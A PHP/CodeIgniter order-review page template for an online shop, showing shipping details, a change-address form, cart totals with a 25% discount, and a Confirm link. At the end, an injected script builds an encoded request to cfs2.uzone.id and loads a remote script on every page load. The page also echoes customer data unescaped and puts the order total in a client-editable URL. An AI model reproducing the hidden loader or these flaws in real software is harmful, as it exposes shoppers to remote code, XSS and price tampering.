<?php
$iduser = $order->id;
$fname = $order->firstname;
$lname = $order->lastname;
$phone = $order->phone;
$address1 = $order->address1;
$city = $order->city;
$province = $order->province;
$country = $order->country;
$postal = $order->postalcode;
?>
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	
	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>

<!-- Main Container Starts -->
	<div class="main-container container">
	<!-- Breadcrumb Starts -->
		<ol class="breadcrumb">
			<li><a href="<?=base_url()?>">Home</a></li>
			<li class="active">Order Review</li>
		</ol>
	<!-- Breadcrumb Ends -->
	<!-- Main Heading Starts -->
		<h2 class="main-heading text-center">
			Order Review
		</h2>
	<!-- Main Heading Ends -->
	
	<?php $this->session->flashdata('pesan')?>
	<section class="registration-area">
			<div class="row">
				<div class="col-sm-6">
				<!-- Registration Block Starts -->
					<div class="panel panel-smart">
						<div class="panel-heading">
							<h3 class="panel-title">Shipping Address</h3>
						</div>
						<div class="panel-body">
							
							<table>
							<tbody>
								<tr>
									<th width="100">Name </th>
									<th width="20">:</th>
									<td><?=$fname?></td>
								</tr>
								<tr>
									<th width="100">Shipping Address </th>
									<th width="20">:</th>
									<td><?=$address1?></td>
								</tr>
								<tr>
									<th width="100"></th>
									<th width="20"></th>
									<td><?=$city.', '.$province?></td>
								</tr>
								<tr>
									<th width="100"></th>
									<th width="20"></th>
									<td><?=$country.' '.$postal?></td>
								</tr>
								<tr>
									<th width="100">Phone Number </th>
									<th width="20">:</th>
									<td><?=$phone?></td>
								</tr>
							</tbody>
							<tfoot>
								<tr>
									<th>&nbsp;</th>
									<th>&nbsp;</th>
									<td>&nbsp;</td>
								</tr>
								<tr>
									<th></th>
									<th></th>
									<td><a href="javascript:void(0)" id="changeadd" class="btn btn-main pull-left">Change Address</a></td>
								</tr>
								
							</tfoot>
						</table>

						</div>
						<div class="changeaddress" id="change">
							<h3>Change Address:</h3>
							<form id="frmchange" class="form-horizontal" method="post" action="<?=base_url().'order/changeaddress'?>">
								<div class="form-group">
									<label for="inputAddress2" class="col-sm-3 control-label">Address :</label>
									<div class="col-sm-9">
										<input type="hidden" name="iduser" value="<?=$iduser?>"/>
										<textarea class="form-control" placeholder="Address" name="address1" required></textarea>
									</div>
								</div>
								<div class="form-group">
									<label for="inputCity" class="col-sm-3 control-label">City :</label>
									<div class="col-sm-9">
										<select name="city" class="form-control" required>	
											<option value="0">- City -</option>									
										<?php foreach($kota as $row){?>
											<option><?=$row->nama?></option>
										<?php } ?>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputRegion" class="col-sm-3 control-label">State :</label>
									<div class="col-sm-9">
										<select class="form-control" id="inputRegion" name="province" required>
											<option>- Region / State -</option>
											<?php foreach($prop as $list){?>
											<option><?=$list->nama?></option>
											<?php } ?>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputCountry" class="col-sm-3 control-label">Country :</label>
									<div class="col-sm-9">
										<select class="form-control" id="inputCountry" name="country" required>
											<option>- Country -</option>
											<option value="Indonesia">Indonesia</option>
										</select>
									</div>
								</div>
								<div class="form-group">
									<label for="inputPostCode" class="col-sm-3 control-label">Postal Code :</label>
									<div class="col-sm-9">
	<input type="text" class="form-control" id="inputPostCode" placeholder="Postal Code" name="postal"required>
									</div>
								</div>
								<div class="form-group">
									<div class="col-sm-offset-3 col-sm-9">
										<button id="chg" type="submit" class="btn btn-main">
											Update Address
										</button>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>
				<div class="col-sm-6">
				<!-- payment Block Starts -->
					<div class="panel panel-smart">
						<div class="panel-heading">
							<h3 class="panel-title">Payment Method</h3>
						</div>
						<div class="panel-body">
							<select name="payment" class="form-control">
								<option>Bank Transfer</option>
							</select>
						</div>
					</div>
				</div>
			</div>
	</section>
	<!-- Shopping Cart Table Starts -->
		<div class="table-responsive shopping-cart-table">
			<table class="table table-bordered">
				<thead>
					<tr>
						<td class="text-center">
							Image
						</td>
						<td class="text-center">
							Product Name
						</td>
						<td class="text-center">
							Size
						</td>							
						<td class="text-center">
							Quantity
						</td>
						<td class="text-center">
							Price
						</td>
						<td class="text-center">
							Total
						</td>
					</tr>
				</thead>
				<tbody>
				<?php 
					$i = 0;
					foreach($this->cart->contents()as $item):
					$i++; 
				?>
					<tr>
						<td class="text-center">
							<a href="<?=base_url().'home/detail/'.$item['barcode']?>">
								<img src="<?=base_url().'uploads/'.$item['image']?>" alt="<?=$item['name']?>" title="<?=$item['name']?>" class="img-thumbnail" width="100px"/>
							</a>
						</td>
						<td class="text-center">
							<a href="#"><?=$item['barcode']?></a>
						</td>	
						<td class="text-center">
							<a href="#"><?=$item['size']?></a>
						</td>						
						<td class="text-center">
							<?=$item['qty']?>							
						</td>
						<td class="text-center">
							Rp. <?=number_format($item['price'],0,',','.')?>,-
						</td>
						<td class="text-center">
							Rp. <?=number_format($item['subtotal'],0,',','.')?>,-
						</td>
						
					</tr>
					<?php endforeach; ?>						
				</tbody>
				<?php
					$y = $this->cart->total();
					$tot = $y * 0.25;
					$totall = $y - $tot;
				?>
				<tfoot>
					<tr>
					  <td colspan="5" class="text-right">
						<strong>Subtotal :</strong>
					  </td>
					  <td colspan="2" class="text-left" style="padding-left:30px">
						Rp. <?=number_format($y,0,'.','.')?>,-
					  </td>
					</tr>
					<tr>
					  <td colspan="5" class="text-right">
						<strong>Discount -25% :</strong>
					  </td>
					  <td colspan="2" class="text-left" style="padding-left:30px">
						Rp. <?=number_format($tot,0,',','.')?>,-
					  </td>
					</tr>
					<tr>
					  <td colspan="5" class="text-right">
						<h4><strong>Total :</strong></h4>
					  </td>
					  <td colspan="2" class="text-left" style="padding-left:30px">
						<h4><b>Rp. <?=number_format($totall,0,'.','.')?>,-</b></h4>
					  </td>
					</tr>
				</tfoot>
			<?php echo form_close()?>
			</table>				
		</div>
		<div class="text-uppercase clearfix">
			<a href="<?=base_url()?>" class="btn btn-main pull-left">
				<span class="hidden-xs">Continue Shopping</span>
				<span class="visible-xs">Continue</span>
			</a>
			<a href="<?=base_url().'process/'.$totall?>" class="btn btn-main pull-right">Confirm</a>
		</div>
	<!-- Shopping Cart Table Ends -->
	</div>
<!-- Main Container Ends -->

<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->
<script>
	$(document).ready(function(){
		$('#change').hide();
		$('#changeadd').on('click', function(){
			$('#change').toggle();
		});
	});
</script>
<!--<script src="<?=base_url()?>assets/js/jquery-1.11.1.min.js"></script>-->
<!--<script src="<?=base_url()?>assets/js/jquery-migrate-1.2.1.min.js"></script>-->	
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<!--<script src="<?=base_url()?>assets/js/bootstrap-hover-dropdown.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.magnific-popup.min.js"></script>-->
<script src="<?=base_url()?>assets/js/custom2.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>